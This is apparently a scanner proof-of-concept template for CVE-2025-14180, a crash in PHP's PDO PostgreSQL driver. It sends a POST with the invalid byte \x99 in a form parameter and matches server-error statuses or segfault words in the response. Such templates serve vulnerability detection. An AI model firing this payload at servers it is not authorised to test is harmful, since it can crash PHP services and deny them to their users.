[info]
author = "ave"
description = 'PHP PDO PostgreSQL 驱动在启用 PDO::ATTR_EMULATE_PREPARES 时，预处理语句参数包含无效字符序列（如 \x99）导致 PQescapeStringConn 返回 NULL，引发 pdo_parse_params() 空指针解引用，触发段错误导致拒绝服务'
id = "POC-AVE-2025-0591"
name = "CVE-2025-14180 PoC"
severity = "high"
tags = ["ave-2025-0591"]
vuln_id = [
    "CVE-2025-14180",
    "AVE-2025-0591",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/poc.php"
protocol = "http"

[poc.requests.body]
content = 'param=\x99'
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Segmentation fault",
    "segfault",
    "SIGSEGV",
    "crash",
    "null pointer dereference",
]
